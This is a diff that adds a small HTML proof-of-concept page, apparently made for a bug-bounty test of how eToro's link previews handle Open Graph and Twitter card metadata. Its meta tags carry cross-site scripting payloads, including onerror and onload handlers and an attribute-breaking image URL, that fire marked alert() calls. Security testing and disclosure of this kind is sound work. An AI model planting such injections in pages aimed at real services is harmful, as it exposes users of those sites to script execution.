@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>PoC</title>
+
+  <!-- Unique marker so any execution is attributable to this test -->
+  <meta property="og:title"
+        content="<img src=x onerror=alert('XSS_ETORO')>" />
+  <meta property="og:description" content="PoC description" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://github.com/Fares318/etoro-og-poc/" />
+
+  <!-- Second test vector: does the media URL get put into src= unsanitized? -->
+  <meta property="og:image"
+        content="x\" onerror=\"alert('XSS_IMG_<YOUR_HANDLE>_<YYYYMMDDHHMM>')\" x=\"" />
+
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title"
+        content="<svg/onload=alert('XSS_TW')>" />
+</head>
+<body>
+  <h1>PoC — OG metadata for SSRF / XSS triage</h1>
+  <p>Contact: &lt;your handle&gt; — &lt;date&gt;. Reporting via &lt;program&gt;.</p>
+</body>
+</html>
